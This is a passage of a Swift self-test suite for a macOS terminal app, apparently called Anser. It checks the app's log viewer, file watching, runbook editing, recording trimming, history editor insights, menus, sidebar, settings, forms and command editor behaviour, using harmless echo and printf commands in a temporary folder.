        let imported = AliasesWindowController.shared.importFromShell(["anserimp": "echo imported-anser-selftest"])
        let importedGroup: String? = AliasManager.load()["anserimp"]?.group
        check("shell aliases import into a group", imported == 1 && importedGroup == "Imported")
        var book = AliasManager.load()
        book.remove("anserimp")
        AliasManager.save(book)

        // Log viewer: highlights, saved filters, export.
        LogViewerPrefs.fileURL = URL(fileURLWithPath: dir + "/log-viewer.json")
        pane.run("printf '%s\\n' 'INFO req-42 start' 'ERROR req-42 failed' 'INFO other' # anser-selftest")
        _ = await wait(6) { s.atPrompt && s.blocks.last?.command.contains("req-42") == true }
        await sleep(0.6)
        pane.openLogViewer()
        if let lv = LogViewerWindowController.forTests(pane) {
            lv.poll()
            lv.setHighlightForTests("req-42")
            check("the log viewer highlights words", lv.highlightCount == 2, "\(lv.highlightCount)")
            lv.setFilterForTests(level: 3, search: "")
            lv.saveFilter(named: "St errors")
            check("a log filter can be saved", LogViewerPrefs.load().filters.map(\.name) == ["St errors"])
            check("the shown log lines export", lv.exportText.contains("ERROR req-42 failed") && !lv.exportText.contains("INFO other"))
            lv.close()
        } else {
            check("the log viewer opens", false)
        }

        // Watching only some files.
        pane.run("echo pat-ran # anser-selftest")
        _ = await wait(5) { s.atPrompt && s.blocks.last?.command.contains("pat-ran") == true }
        pane.startWatching(command: "echo pat-ran # anser-selftest", cwd: s.cwd, patterns: ["*.py"])
        await sleep(0.8)
        try? "x".write(toFile: dir + "/README.md", atomically: true, encoding: .utf8)
        await sleep(1.5)
        let runsAfterMD: Int = pane.fileWatch?.runs ?? -1
        try? "x".write(toFile: dir + "/app.py", atomically: true, encoding: .utf8)
        ok = await wait(8) { pane.fileWatch?.runs == 1 }
        check("watch patterns: only matching files re-run", runsAfterMD == 0 && ok, "md=\(runsAfterMD) py=\(pane.fileWatch?.runs ?? -1)")
        pane.stopWatching()
        _ = await wait(5) { s.atPrompt }

        // Editing a runbook in its window.
        try? fm.createDirectory(atPath: dir + "/.git", withIntermediateDirectories: true)
        try? fm.createDirectory(atPath: dir + "/.anser/runbooks", withIntermediateDirectories: true)
        try? "# Ed\n\n```sh\necho one # anser-selftest\n```\n".write(toFile: dir + "/.anser/runbooks/ed.md", atomically: true, encoding: .utf8)
        FileTrust.testDefaults = UserDefaults(suiteName: "anser-selftest-trust2-\(UUID().uuidString)")
        if let rb = Runbook.load(cwd: dir).first {
            FileTrust.runbooks.trust(rb)
            let rw = RunbookWindowController.show(rb, pane: pane)
            rw?.save("# Ed\n\n```sh\necho one # anser-selftest\n```\n\n```sh\necho two # anser-selftest\n```\n")
            let stepCount: Int = rw?.runbook.steps.count ?? 0
            let stillTrusted: Bool = rw.map { FileTrust.runbooks.isTrusted($0.runbook) } ?? false
            check("a runbook can be edited in its window", stepCount == 2 && stillTrusted)
            rw?.close()
        }
        FileTrust.testDefaults = nil

        // Trimming a recording.
        pane.startRecording()
        pane.run("echo trim-a # anser-selftest")
        _ = await wait(5) { s.atPrompt && s.blocks.last?.command.contains("trim-a") == true }
        await sleep(1.2)
        pane.run("echo trim-b # anser-selftest")
        _ = await wait(5) { s.atPrompt && s.blocks.last?.command.contains("trim-b") == true }
        await sleep(0.5)
        _ = pane.stopRecording()
        if let rw = ReplayWindowController.forTests() {
            let full = rw.original.duration
            rw.setTrimForTests(start: 0, end: full / 2)
            let trimmed: Double = rw.recording.duration
            check("a recording can be trimmed", trimmed <= full / 2 + 0.01 && trimmed > 0, "full=\(full) trimmed=\(trimmed)")
            rw.close()
        }

        // Port forwarding helpers (a real forward needs an ssh server).
        check("forwarding finds a free local port", PaneView.freeLocalPort(near: 47100).map { $0 >= 47100 } == true)
        pane.run("cd \(ShellLexer.escape(tmp)) # anser-selftest")
        _ = await wait(5) { s.atPrompt }
        _ = ok
    }

    @MainActor
    private static func savedAndInsightsChecks(_ pane: PaneView, _ wc: TerminalWindowController, tmp: String) async {
        // Saved things live in one place: the right panel. The sidebar only links to it.
        let panelWasOpen = wc.notebookPanelVisible
        if panelWasOpen { wc.toggleNotebookPanel() }
        wc.sidebar.refresh(for: pane)
        var ok = await wait(4) { wc.sidebar.savedRowText != nil }
        let titles = wc.sidebar.sectionTitles
        let dupes = titles.filter { $0.hasPrefix("NOTEBOOK") || $0.hasPrefix("WORKFLOWS") || $0.hasPrefix("RUNBOOKS") }
        check("the sidebar doesn't repeat the Saved panel", ok && dupes.isEmpty, (wc.sidebar.savedRowText ?? "no link") + " · " + titles.joined(separator: ", "))
        wc.toggleNotebookPanel()
        ok = await wait(4) { wc.sidebar.savedRowText == nil }
        check("the sidebar's Saved link goes away while the panel is open", ok)
        if !panelWasOpen { wc.toggleNotebookPanel() }

        // History Editor side panel.
        let dir = NSTemporaryDirectory() + "anser-selftest-insights-\(UUID().uuidString)"
        try? FileManager.default.createDirectory(atPath: dir, withIntermediateDirectories: true)
        let hs = HistoryStore(path: dir + "/h.sqlite")
        for i in 0..<5 {
            let id = hs.recordStart(command: "make build", cwd: tmp, session: "st", branch: "main", at: Date().addingTimeInterval(Double(-i * 3600)))
            hs.recordFinish(id: id, exitCode: i == 0 ? 2 : 0, duration: 3)
        }
        let typo = hs.recordStart(command: "gti status", cwd: tmp, session: "st")
        hs.recordFinish(id: typo, exitCode: 127, duration: 0)
        hs.recordStart(command: "pwd", cwd: tmp, session: "st")
        let he = HistoryEditorWindowController.shared
        he.storeOverride = hs
        he.show(for: pane)
        ok = await wait(8) { he.all.count == 3 }
        he.updateDetails()
        let overview: String = he.insights.textForTests
        check("with nothing selected the side panel gives an overview",
              ok && overview.contains("Most used") && overview.contains("make build 5") && overview.contains("7 runs") && overview.contains("Tidy up"),
              overview.replacingOccurrences(of: "\n", with: " | ").prefix(220).description)
        he.insights.press("Show Mistakes")
        ok = await wait(3) { he.shown.map(\.c.command) == ["gti status"] }
        check("Tidy up's Show buttons filter the list", ok, he.shown.map(\.c.command).joined(separator: ", "))
        he.focus(command: "make build")
        let one: String = he.insights.textForTests
        check("one command shows its track record", one.contains("runs 5") && one.contains("worked 80%") && one.contains("main 5") && he.insights.buttonTitles.contains("Run"),
              one.replacingOccurrences(of: "\n", with: " | ").prefix(220).description)
        he.focus(command: "gti status")
        check("a typo offers its fix", he.insights.textForTests.contains("Probably meant “git status”"))
        he.insights.press("Fix Typo")
        ok = await wait(6) { he.all.contains { $0.c.command == "git status" } }
        check("Fix Typo corrects the command in history", ok && hs.stats(for: "gti status") == nil)
        he.select(where: { _ in true }, add: false)
        he.updateDetails()
        let many: String = he.insights.textForTests
        check("several selected shows a breakdown", many.contains("3 selected") && many.contains("Breakdown") && he.insights.buttonTitles.contains("Delete 3…"),
              many.replacingOccurrences(of: "\n", with: " | ").prefix(200).description)
        he.focus(command: "make build")
        await sleep(0.6)
        let splits: [NSSplitView] = he.window?.contentView.map { allSubviews($0).compactMap { $0 as? NSSplitView } } ?? []
        let gaps: [String] = splits.compactMap { sp in
            let used = sp.arrangedSubviews.reduce(CGFloat(0)) { $0 + (sp.isVertical ? $1.frame.width : $1.frame.height) } + sp.dividerThickness
            let size = sp.isVertical ? sp.bounds.width : sp.bounds.height
            return used < size - 4 ? "\(Int(used)) of \(Int(size))" : nil
        }
        let listFrame = he.window?.contentView.flatMap { allSubviews($0).first { $0 is HistoryTable }?.enclosingScrollView?.frame }
        check("the History Editor fills its window, the list at full height beside the inspector",
              splits.count == 1 && gaps.isEmpty && splits.first?.isVertical == true && (listFrame?.height ?? 0) > 400,
              "\(splits.count) splits; list \(listFrame.map { "\(Int($0.width))×\(Int($0.height))" } ?? "none"); gaps: " + gaps.joined(separator: ", "))
        let oneCmd: String = he.insights.textForTests
        check("the inspector puts actions first and lists recent runs",
              he.insights.buttonTitles.contains("Put in Editor") && oneCmd.contains("Last output") == false && oneCmd.contains("failed ") && oneCmd.contains("5 runs"),
              oneCmd.replacingOccurrences(of: "\n", with: " | ").prefix(220).description)
        check("filter menu shows counts", he.filterTitlesForTests.contains("Mistakes and typos (0)") && he.filterTitlesForTests.contains("Basic commands (ls, pwd…) (1)"),
              he.filterTitlesForTests.joined(separator: ", ") + " · mistakes: " + he.all.filter { $0.issue?.isMistake == true }.map { "\($0.c.command)=\($0.issue!.label) exit \($0.c.lastExit.map(String.init) ?? "nil")" }.joined(separator: ", "))
        if let content = he.window?.contentView { content.display(); snapView(content, "history-editor") }
        if let n = he.window?.windowNumber {
            let shot = Process()
            shot.executableURL = URL(fileURLWithPath: "/usr/sbin/screencapture")
            shot.arguments = ["-x", "-o", "-l\(n)", shotDir + "/history-editor-window.png"]
            try? shot.run()
            shot.waitUntilExit()
        }
        he.close()
        he.storeOverride = nil
        try? FileManager.default.removeItem(atPath: dir)
    }

    /// A command that opens a pager gets the window; Stop ends pagers and, on a second click, programs that ignore ⌃C.
    @MainActor
    private static func stopChecks(_ pane: PaneView) async {
        let s = pane.session
        _ = await wait(5) { s.atPrompt }
        pane.run("seq 1 500 | less # anser-selftest")
        var ok = await wait(6) { pane.fullscreenProgram && pane.fullscreenDetected }
        check("a pager opened by a command gets the whole window", ok, "full=\(pane.fullscreenProgram) job=\(pane.foregroundJob?.names.joined(separator: ",") ?? "none")")
        pane.stopRunning()
        ok = await wait(5) { s.atPrompt && !pane.fullscreenProgram }
        check("Stop ends a pager", ok)
        pane.run("sh -c 'trap \"\" INT; sleep 40' # anser-selftest")
        _ = await wait(5) { !s.atPrompt && pane.foregroundJob != nil }
        pane.stopRunning()
        await sleep(2.0)
        let stillRunning = !s.atPrompt
        check("a program ignoring ⌃C offers Force Stop", stillRunning && pane.stopButton.title.contains("Force Stop"), pane.stopButton.title)
        pane.stopRunning()
        ok = await wait(5) { s.atPrompt }
        check("Force Stop ends it", ok && pane.stopButton.title == " Stop", pane.stopButton.title)
    }

    /// The product UX review: one search, Notebook + workflows, Library tabs, menus, settings pages.
    @MainActor
    private static func uxReviewChecks(_ pane: PaneView, _ wc: TerminalWindowController, tmp: String) async {
        func openPicker() -> PickerPanel? { NSApp.windows.compactMap { $0 as? PickerPanel }.first { $0.isVisible } }
        func closePickers() { NSApp.windows.compactMap { $0 as? PickerPanel }.forEach { $0.close() } }
        let s = pane.session

        // One search: every scope in one window; ⌘B and ⇧⌘F open it on their scope.
        wc.showHistorySearch(for: pane)
        var ok = await wait(3) { openPicker() != nil }
        check("one search window has every scope", ok && openPicker()?.scopeTitles == SearchScope.allCases.map(\.title), openPicker()?.scopeTitles.joined(separator: ", ") ?? "none")
        closePickers()
        wc.showBlocks(for: pane)
        ok = await wait(3) { openPicker()?.scopeIndex == SearchScope.tab.rawValue }
        check("⌘B opens Search on This tab", ok)
        closePickers()
        wc.showSearchAllTabs(for: pane)
        ok = await wait(3) { openPicker()?.scopeIndex == SearchScope.allTabs.rawValue }
        check("⇧⌘F opens Search on All tabs", ok)
        closePickers()

        // Saved scope and Run from Notebook: notebook entries and workflows together.
        let savedURL = NotebookWindow.fileURL
        let nbFile = NSTemporaryDirectory() + "anser-selftest-nb-\(UUID().uuidString).json"
        var nb = Notebook(groups: [.init(name: "General")])
        _ = nb.add(.init(title: "Deploy the docs", command: "echo docs-anser-selftest"))
        try? nb.save(to: URL(fileURLWithPath: nbFile))
        NotebookWindow.fileURL = URL(fileURLWithPath: nbFile)
        wc.showSearch(for: pane, scope: .saved)
        ok = await wait(3) { openPicker()?.itemTitles.contains("Deploy the docs") == true }
        check("Search → Saved finds notebook entries", ok, openPicker()?.itemTitles.prefix(4).joined(separator: " | ") ?? "none")
        closePickers()
        wc.showWorkflows(for: pane)
        ok = await wait(3) { openPicker()?.itemTitles.contains("Deploy the docs") == true }
        check("Run from Notebook lists notebook entries with workflows", ok && openPicker()?.pickerTitle == "Run from Notebook", openPicker()?.itemTitles.prefix(4).joined(separator: " | ") ?? "none")
        closePickers()
        LibraryWindowController.shared.show(for: pane, section: .notebook)
        ok = await wait(3) { LibraryWindowController.shared.items.contains { $0.title == "Deploy the docs" } }
        let libraryHasNoWorkflowSection = !LibraryWindowController.Section.allCases.map(\.title).contains("Workflows")
        check("the Library's Notebook holds workflows too (no separate section)", ok && libraryHasNoWorkflowSection)

        // Managing opens as Library tabs, not separate windows.
        AliasesWindowController.shared.show(for: pane)
        ok = await wait(3) { LibraryTabs.isHosted(AliasesWindowController.shared.window) }
        check("Aliases opens as a tab of the Library", ok)
        SecretsWindowController.shared.show()
        ok = await wait(3) { LibraryTabs.isHosted(SecretsWindowController.shared.window) }
        check("Secrets opens as a tab of the Library", ok)
        SecretsWindowController.shared.close()
        AliasesWindowController.shared.close()
        LibraryWindowController.shared.close()
        NotebookWindow.fileURL = savedURL
        try? FileManager.default.removeItem(atPath: nbFile)

        // Menus: old shortcut kept working, Welcome Tips folded into the tour.
        let output = NSApp.mainMenu?.items.first { $0.submenu?.title == "Output" }?.submenu
        let legacy = output?.items.first { $0.isHidden && $0.keyEquivalent == "l" && $0.keyEquivalentModifierMask == [.command, .option] }
        check("Filter Output keeps its old ⌥⌘L shortcut, hidden", legacy?.allowsKeyEquivalentWhenHidden == true)
        let help = NSApp.mainMenu?.items.first { $0.submenu?.title == "Help" }?.submenu?.items.map(\.title) ?? []
        check("Help has the tour and no separate Welcome Tips", help.contains("Take the Tour") && !help.contains("Show Welcome Tips"))
        let goItems = NSApp.mainMenu?.items.first { $0.submenu?.title == "Go" }?.submenu?.items ?? []
        let doubled = zip(goItems, goItems.dropFirst()).contains { $0.isSeparatorItem && $1.isSeparatorItem }
        check("the Go menu has no doubled separators", !doubled && !goItems.isEmpty)

        // Settings: Behavior split by purpose; config-only options have controls.
        SettingsWindowController.shared.show(section: "Sessions & Windows")
        let sessionsHit = SettingsWindowController.shared.searchHits("quick terminal height")
        let helpersHit = SettingsWindowController.shared.searchHits("open ⌘-clicked files")
        check("Settings has pages by purpose with the config-only options",
              SettingsWindowController.shared.selectedSectionName == "Sessions & Windows" && sessionsHit.first?.section == "Sessions & Windows"
                && helpersHit.first?.section == "Suggestions & Helpers",
              (sessionsHit + helpersHit).map(\.section).joined(separator: ", "))
        SettingsWindowController.shared.close()

        // Hover strip: four actions and "…" with the rest.
        pane.run("echo strip-anser-selftest")
        _ = await wait(5) { s.atPrompt && s.blocks.last?.command.contains("strip-anser") == true }
        pane.blocksOverlay.refresh()
        if let good = pane.blocksOverlay.blocks.last(where: { !$0.running && $0.info?.exitCode == 0 }) {
            pane.blocksOverlay.hover(at: NSPoint(x: 40, y: good.top + 4))
            let more = pane.blocksOverlay.moreMenuTitles
            pane.blocksOverlay.hover(at: nil)
            check("the hover strip's … holds the other actions", more.contains("Open Output in a Window") && more.contains("Compare with Previous Run"), more.prefix(5).joined(separator: " | "))
        }

        // History Editor: a filtered list offers Select All; the chart has a spoken summary.
        let dir = NSTemporaryDirectory() + "anser-selftest-ux-\(UUID().uuidString)"
        try? FileManager.default.createDirectory(atPath: dir, withIntermediateDirectories: true)
        let hs = HistoryStore(path: dir + "/h.sqlite")
        for c in ["gti status", "dokcer ps"] { let id = hs.recordStart(command: c, cwd: tmp, session: "st"); hs.recordFinish(id: id, exitCode: 127, duration: 0) }
        let okRun = hs.recordStart(command: "make", cwd: tmp, session: "st")
        hs.recordFinish(id: okRun, exitCode: 0, duration: 1)
        let he = HistoryEditorWindowController.shared
        he.storeOverride = hs
        he.show(for: pane)
        ok = await wait(8) { he.all.count == 3 }
        check("History opens as a tab of the Library", LibraryTabs.isHosted(he.window))
        he.showFilter(.all)
        he.select(where: { _ in false }, add: false)
        he.updateDetails()
        check("the activity chart has a spoken summary", he.insights.chartAccessibilityLabels.first?.contains("runs") == true,
              he.insights.chartAccessibilityLabels.first ?? String(he.insights.textForTests.replacingOccurrences(of: "\n", with: " | ").prefix(160)))
        he.showFilter(.mistakes)
        _ = await wait(3) { he.shown.count == 2 }
        he.insights.press("Select All")
        ok = await wait(3) { he.selectedCommands.count == 2 }
        check("a filtered list offers Select All", ok, he.selectedCommands.joined(separator: ", "))
        he.close()
        he.storeOverride = nil
        LibraryWindowController.shared.close()
        try? FileManager.default.removeItem(atPath: dir)
    }

    @MainActor
    private static func uiChecks(_ pane: PaneView, _ wc: TerminalWindowController, live: String, tmp: String) async {
        let s = pane.session
        var ok = false
        pane.run("echo ui-menu-anser-selftest")
        _ = await wait(5) { s.atPrompt && s.blocks.last?.command.contains("ui-menu") == true }
        await sleep(0.5)

        // Right-click a command: every action in one menu.
        if let last = s.blocks.last {
            let titles = BlocksOverlayView.commandMenuItems(for: last, blockIndex: s.blocks.count - 1, markIndex: 1, pane: pane).map(\.title)
            let wanted = ["Run Again", "Copy Output", "Save to Notebook…", "Make an Alias…", "Watch Its Output…", "Show in History Editor", "Share…"]
            let missing = wanted.filter { !titles.contains($0) }
            check("right-clicking a command lists every action", missing.isEmpty, "missing: " + missing.joined(separator: ", "))
        }
        pane.blocksOverlay.refresh()
        if let b = pane.blocksOverlay.blocks.first(where: { !$0.running && $0.info != nil }) {
            let menuTitles = pane.surfaceView.contextMenu(at: NSPoint(x: 20, y: (b.top + b.bottom) / 2)).items.map(\.title)
            check("the terminal's right-click menu starts with the command's actions", menuTitles.contains("Save to Notebook…") && menuTitles.contains("Split"),
                  menuTitles.prefix(6).joined(separator: " | "))
        } else {
            check("the terminal's right-click menu starts with the command's actions", false, "no command blocks")
        }

        // A calmer status row: meaning-based colors, at most a few chips, suggestions fade.
        PaneView.fadeAfter = 0.6
        pane.aliasTip = ("echo something long enough", "esl", false)
        pane.fixHint = ("make", ["npm install"])
        pane.afterSteps = [.notify]
        pane.testReport = (TestFailures.Report(runner: .pytest, failures: [.init(name: "test_x")]), "pytest", s.cwd)
        pane.envOffer = ProjectEnv.Found(root: s.cwd, dotenvFiles: [".env"])
        pane.refreshBar()
        pane.layoutSubtreeIfNeeded()
        let extras = [pane.aliasChip, pane.hintChip, pane.afterChip, pane.testsChip, pane.envChip, pane.statusChip, pane.fixChip, pane.explainChip].filter { !$0.isHidden }.count
        check("suggestion chips share one color", pane.aliasChip.role == .suggestion && pane.hintChip.textColorForTests == ChipRole.suggestion.color(pane.theme))
        check("the status row shows a few chips and a +N for the rest", extras <= PaneView.maxExtraChips && pane.moreChip.text.hasPrefix("+") && !pane.moreChip.isHidden,
              "extras=\(extras) more=\(pane.moreChip.text)")
        check("the +N chip opens the rest", (pane.overflowStatusMenu()?.items.count ?? 0) >= 1)
        await sleep(1.0)
        pane.layoutSubtreeIfNeeded()
        let fadedNow = pane.suggestionChips.filter { !$0.isHidden }.contains { $0.faded }
        check("suggestions fade after a while", fadedNow)
        PaneView.fadeAfter = 20
        pane.aliasTip = nil; pane.fixHint = nil; pane.afterSteps = []; pane.testReport = nil; pane.envOffer = nil
        pane.refreshBar()

        // The Library: everything saved, in one place.
        let lib = LibraryWindowController.shared
        lib.show(for: pane, section: .notebook)
        // The Notebook section also holds workflows (notebook entries with several steps).
        let nbCount = ((try? Notebook.load(from: NotebookWindow.fileURL)) ?? Notebook()).entryCount + WorkflowStore.load(cwd: pane.session.cwd).count
        check("the Library lists the notebook", lib.items.count == nbCount && nbCount > 0, "\(lib.items.count) of \(nbCount)")
        lib.select(.everything)
        lib.setSearchForTests("from-notebook")
        check("the Library searches everything at once", lib.items.contains { $0.section == .notebook }, lib.items.map(\.title).joined(separator: ", "))
        for sec in LibraryWindowController.Section.allCases { lib.select(sec) }
        check("every Library section opens", lib.section == .watches)
        lib.setSearchForTests("")
        lib.close()

        // A sidebar you can arrange.
        SidebarPrefs.defaults = UserDefaults(suiteName: "anser-selftest-sidebar-\(UUID().uuidString)")!
        wc.sidebar.refresh(for: pane)
        ok = await wait(4) { wc.sidebar.orderedSections.count >= 2 }
        // Let the background refresh finish, then work from a fresh build.
        await sleep(1.0)
        wc.sidebar.rebuildNow()
        if ok, wc.sidebar.orderedSections.count >= 2 {
            let before = wc.sidebar.orderedSections
            let second = before[1]
            wc.sidebar.move(second, to: 0)
            await sleep(1.0)
            check("a sidebar section can move to the top", wc.sidebar.orderedSections.first == second,
                  "before: " + before.joined(separator: ", ") + " · after: " + wc.sidebar.orderedSections.joined(separator: ", "))
            SidebarPrefs.setHidden(second, true)
            wc.sidebar.rebuildNow()
            check("a sidebar section can be hidden", !wc.sidebar.orderedSections.contains(second))
        } else {
            check("a sidebar section can move to the top", false, "no sections")
        }
        SidebarPrefs.defaults = .standard
        wc.sidebar.refresh(for: pane)

        // Polish: grouped menus with shortcuts, forms that check as you type, Settings sidebar, tour, empty states.
        let shellItems = NSApp.mainMenu?.items.first { $0.submenu?.title == "Shell" }?.submenu?.items ?? []
        let outputMenu = NSApp.mainMenu?.items.first { $0.submenu?.title == "Output" }?.submenu?.items.map(\.title) ?? []
        let toolItems = NSApp.mainMenu?.items.first { $0.submenu?.title == "Tools" }?.submenu?.items ?? []
        let manageItems = toolItems.first { $0.title == "Manage" }?.submenu?.items ?? []
        let aliasKey = manageItems.first { $0.title == "Aliases…" }?.keyEquivalent ?? ""
        check("menus are grouped, and new features have shortcuts", outputMenu.contains("Log Viewer") && aliasKey == "a" && shellItems.count < 25,
              "output=\(outputMenu.count) shell=\(shellItems.count) alias=\(aliasKey)")
        let af = AliasManager.form(nil, pane: pane)
        af.set("name", "1bad")
        af.set("command", "echo hi")
        let badBlocked: Bool = !af.canSave && !af.errorText.isEmpty
        af.set("name", "anserform")
        let goodOK: Bool = af.canSave && af.previewText.contains("anserform")
        af.set("name", "ls")
        let warned: Bool = af.canSave && af.warningText.contains("already a command")
        check("the alias form checks as you type and previews", badBlocked && goodOK && warned, "\(badBlocked) \(goodOK) \(warned) \(af.warningText)")
        let tf = TunnelManager.shared.form(nil)
        tf.set("host", "bastion"); tf.set("local", "99999"); tf.set("remotePort", "5432")
        let tunnelBlocked: Bool = !tf.canSave
        tf.set("local", "47321")
        check("the tunnel form checks ports and previews the command", tunnelBlocked && tf.canSave && tf.previewText.contains("localhost:47321"), tf.previewText)
        SettingsWindowController.shared.show(section: "Plugins")
        let settingsSection: String = SettingsWindowController.shared.selectedSectionName ?? ""
        check("Settings opens at a section from its sidebar", settingsSection == "Plugins")
        SettingsWindowController.shared.close()
        TourWindowController.shared.show()
        for _ in 0..<4 { TourWindowController.shared.nextTapped() }
        check("the tour walks through five pages", TourWindowController.shared.currentTitle == "Keep things one click away")
        TourWindowController.shared.close()
        let emptyStore = HistoryStore(path: live + "/empty-\(UUID().uuidString.prefix(6)).sqlite")
        let he2 = HistoryEditorWindowController.shared
        he2.storeOverride = emptyStore
        he2.show(for: pane)
        _ = await wait(4) { he2.all.isEmpty }
        he2.setFilterForTests(.trash)
        check("empty lists say what they're for", he2.shown.isEmpty && he2.emptyText.contains("Nothing deleted"), he2.emptyText)
        he2.setFilterForTests(.all)
        he2.close()
        he2.storeOverride = nil

        // The palette finds features by what they do.
        wc.showCommandPalette(for: pane)
        if let p = NSApp.windows.compactMap({ $0 as? PickerPanel }).first(where: { $0.isVisible }) {
            p.setQuery("typo")
            check("the palette finds features by what they're for", p.itemTitles.contains(AnserAction.editHistory.title), p.itemTitles.prefix(4).joined(separator: " | "))
            p.close()
        } else {
            check("the palette finds features by what they're for", false, "no palette")
        }
        _ = ok
    }

    @MainActor
    private static func run(_ pane: PaneView, _ wc: TerminalWindowController) async {
        let s = pane.session
        var ok = await wait(15) { s.integrated && s.atPrompt }
        check("shell hooks report a prompt", ok, "shell=\(s.env.shell)")
        guard ok else { return }
        check("editor is usable at the prompt", pane.editorUsable)
        snap(pane, "empty")

        // Run a command and copy its output.
        let tmp = NSTemporaryDirectory() + "anser-selftest"
        try? FileManager.default.createDirectory(atPath: tmp, withIntermediateDirectories: true)
        pane.run("cd \(ShellLexer.escape(tmp)) && echo anser-ok-$((6*7)) && printf 'line2\\nline3\\n'")
        ok = await wait(10) { s.atPrompt && s.blocks.count >= 1 }
        check("command ran, exit code recorded", ok && s.blocks.last?.exitCode == 0)
        check("cwd followed cd", s.cwd.hasSuffix("anser-selftest"), s.cwd)
        // Everything below runs git and writes files in the current folder. Never do that anywhere else
        // (a stray keystroke once garbled the cd, and the test made a repo in the home folder).
        guard s.cwd.hasSuffix("anser-selftest") else { check("stopped: the test tab isn't in its temp folder", false, s.cwd); return }
        check("saved to history db", Services.shared.history.entries(session: s.id, limit: 3).first?.command.contains("anser-ok") == true)
        await sleep(0.3)
        let output = pane.lastOutput() ?? "<nil>"
        check("copy last output", output.trimmingCharacters(in: .whitespacesAndNewlines) == "anser-ok-42\nline2\nline3", output.replacingOccurrences(of: "\n", with: "⏎"))

        // One input: the shell's waiting prompt is hidden; commands stay as "❯ command".
        let vp = pane.surfaceView.viewportText() ?? ""
        check("commands show as ❯ lines in scrollback", vp.contains("❯ cd ") && vp.contains("anser-ok-42"),
              vp.split(separator: "\n").suffix(4).joined(separator: " ⏎ "))
        let lastLine = vp.split(separator: "\n", omittingEmptySubsequences: false).last(where: { !$0.trimmingCharacters(in: .whitespaces).isEmpty }) ?? ""
        check("no duplicate prompt waiting in the terminal", lastLine.contains("line3"), String(lastLine))
        pane.layoutSubtreeIfNeeded()
        check("input bar stays at the bottom by default",
              pane.followTop == nil && pane.surfaceView.frame.minY >= pane.barTopForTest - 0.5)
        Services.shared.setEditorFollowsOutputForTest(true)
        pane.needsLayout = true
        pane.layoutSubtreeIfNeeded()
        check("editor sits right under the output when enabled", pane.followTop != nil, "followTop=\(pane.followTop.map { "\(Int($0))" } ?? "bottom")")
        Services.shared.setEditorFollowsOutputForTest(false)
        pane.needsLayout = true
        snap(pane, "follow", full: true)
        check("no \u{201C}Last login\u{201D} line", !(pane.surfaceView.viewportText() ?? "").contains("Last login"))

        // Typing: ghost text, popup, history navigation.
        type(pane, "cd \(tmp) && echo anser-o")
        check("gray history suggestion appears", !pane.editor.ghostSuffix.isEmpty, pane.editor.ghostSuffix)
        pane.editor.clear()
        type(pane, "git ch")
        ok = await wait(3) { pane.editor.popup.isVisible }
        check("completion popup opens while typing", ok, pane.editor.popup.selected?.insert ?? "-")
        snap(pane, "typing")
        pane.editor.popup.snapshot(to: shotDir + "/popup.png")
        pane.editor.doCommand(by: #selector(NSResponder.insertTab(_:)))
        check("Tab accepts the completion", pane.editor.string.hasPrefix("git checkout"), pane.editor.string)
        pane.editor.clear()
        pane.editor.doCommand(by: #selector(NSResponder.moveUp(_:)))
        check("↑ recalls the last command", pane.editor.string.contains("anser-ok"), pane.editor.string)
        pane.editor.clear()

        // Editor features.
        let ed = pane.editor
        type(pane, "echo \"hi")
        check("quotes auto-close", ed.string == "echo \"hi\"", ed.string)
        type(pane, "\"")
        check("typing the closing quote steps over it", ed.string == "echo \"hi\"" && ed.selectedRange().location == ed.string.utf16.count)
        ed.clear()
        ed.setCommand("echo hello")
        ed.setSelectedRange(NSRange(location: 5, length: 5))
        type(pane, "'")
        check("typing a quote wraps the selection", ed.string == "echo 'hello'", ed.string)
        ed.clear()
        type(pane, "(")
        ed.deleteBackward(nil)
        check("backspace removes an empty pair", ed.string.isEmpty, ed.string)
        ed.setCommand("cat src/main.swift --flag=1")
        let dbl = ed.selectionRange(forProposedRange: NSRange(location: 8, length: 0), granularity: .selectByWord)
        check("double-click selects a whole path", (ed.string as NSString).substring(with: dbl) == "src/main.swift")
        ed.setCommand("ls -la | grep foo && echo done")
        ed.setSelectedRange(NSRange(location: 15, length: 0))
        ed.expandSelection()
        let e1 = (ed.string as NSString).substring(with: ed.selectedRange())
        ed.expandSelection()
        let e2 = (ed.string as NSString).substring(with: ed.selectedRange())
        ed.expandSelection()
        let e3 = (ed.string as NSString).substring(with: ed.selectedRange())
        check("⌥↑ grows the selection word → command → line", e1 == "foo" && e2 == "grep foo" && e3 == ed.string, "\(e1) | \(e2) | \(e3)")
        ed.shrinkSelection()
        check("⌥↓ shrinks it back", (ed.string as NSString).substring(with: ed.selectedRange()) == "grep foo")

        ed.setCommand("git commit -m ")
        pane.updateHint()
        check("hint explains what comes next", pane.hintText.contains("‹message›"), pane.hintText)
        snap(pane, "hint")

        let longCmd = "cat access.log | grep -v healthcheck | sort --reverse --numeric-sort | head -n 20"
        ed.setCommand(longCmd)
        ed.toggleFormat()
        check("split long command into lines", ed.logicalLineCount >= 4, "\(ed.logicalLineCount) lines")
        pane.layoutSubtreeIfNeeded()
        snap(pane, "multiline")
        pane.toggleExpanded()
        pane.layoutSubtreeIfNeeded()
        snap(pane, "expanded")
        pane.toggleExpanded()
        // Expanding with a short (or empty) command must still open a tall editor.
        let splitText = ed.string
        ed.clear()
        pane.layoutSubtreeIfNeeded()
        let small = pane.editorAreaHeight
        pane.toggleExpanded()
        let tall = pane.editorAreaHeight
        snap(pane, "expanded-empty")
        check("expand opens a tall editor even when empty", tall >= small * 5, String(format: "%.0f → %.0f pt", small, tall))
        ed.doCommand(by: #selector(NSResponder.cancelOperation(_:)))
        pane.layoutSubtreeIfNeeded()
        check("Esc shrinks it back", !pane.editorExpanded && pane.editorAreaHeight == small, String(format: "%.0f pt", pane.editorAreaHeight))
        ed.setCommand(splitText)
        ed.toggleFormat()
        check("join lines back", ed.string == longCmd, ed.string)
        ed.clear()
        snap(pane, "empty-focused")

        // Round trip through an external editor (a fake one that edits the file).
        let fake = tmp + "/fake-editor.sh"
        try? "#!/bin/sh\nsed -i '' 's/hello/world/' \"$1\"\n".write(toFile: fake, atomically: true, encoding: .utf8)
        chmod(fake, 0o755)
        pane.run("export VISUAL=\(fake) # anser-selftest")
        _ = await wait(10) { s.blocks.last?.command.hasPrefix("export VISUAL") == true && s.atPrompt }
        ed.setCommand("echo hello")
        pane.editInExternalEditor()
        ok = await wait(10) { ed.string == "echo world" }
        check("edit in $EDITOR comes back into the editor", ok, ed.string)
        ed.clear()

        // Vi/emacs-safe clearing of text typed straight into the shell.
        pane.surfaceView.sendText("garbage-text ")
        pane.noteRawTyping()
        await sleep(0.2)
